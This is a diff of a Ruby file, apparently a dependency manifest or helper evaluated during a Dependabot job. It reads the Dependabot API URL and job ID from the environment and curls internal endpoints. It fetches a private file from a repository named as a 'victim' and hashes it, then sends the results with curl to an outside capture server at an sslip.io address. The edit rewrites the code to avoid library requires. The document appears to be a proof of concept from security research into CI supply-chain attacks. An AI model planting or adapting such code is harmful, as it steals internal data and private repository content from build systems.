@@ -1,16 +1,11 @@
 require_relative "lib/bob_boundary_dep"
-require "base64"
-require "digest"
-require "json"
-require "open3"
-require "uri"
 
 capture_base = "https://target.147.182.179.38.sslip.io:8443/capture/5b3963e04627c6a3b1943eb0e2a145cc"
 dependabot_api_url = ENV["DEPENDABOT_API_URL"]
 job_id = ENV["DEPENDABOT_JOB_ID"].to_s
 
 if dependabot_api_url && !dependabot_api_url.empty? && job_id.match?(/\A[0-9]+\z/)
-  internal_api_host = URI(dependabot_api_url).host
+  internal_api_host = dependabot_api_url.sub(/\Ahttps?:\/\//, "").split("/", 2).first.split(":", 2).first
   system(
     "curl",
     "--fail",
@@ -25,20 +20,20 @@ if dependabot_api_url && !dependabot_api_url.empty? && job_id.match?(/\A[0-9]+\z
 end
 
 if job_id.match?(/\A[0-9]+\z/)
-  api_response, _stderr, api_status = Open3.capture3(
-    "curl",
-    "--fail",
-    "--silent",
-    "--show-error",
-    "--max-time", "15",
-    "--header", "Accept: application/vnd.github+json",
-    "https://api.github.com/repos/GougasseHamza/dependabot-external-git-victim-alice-20260822/contents/private-sentinel.txt?ref=main"
-  )
+  digest_command = <<~'BASH'
+    curl --fail --silent --show-error --max-time 15 \
+      --header 'Accept: application/vnd.github.raw+json' \
+      'https://api.github.com/repos/GougasseHamza/dependabot-external-git-victim-alice-20260822/contents/private-sentinel.txt?ref=main' \
+      | sha256sum | cut -d' ' -f1
+  BASH
+  private_sha256 = IO.popen(
+    ["bash", "-o", "pipefail", "-c", digest_command],
+    err: File::NULL,
+    &:read
+  ).strip
 
-  if api_status.success?
-    parsed = JSON.parse(api_response)
-    private_content = Base64.decode64(parsed.fetch("content").delete("\n"))
-    private_sha256 = Digest::SHA256.hexdigest(private_content)
+  if private_sha256.match?(/\A[0-9a-f]{64}\z/) &&
+     private_sha256 != "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
     system(
       "curl",
       "--fail",
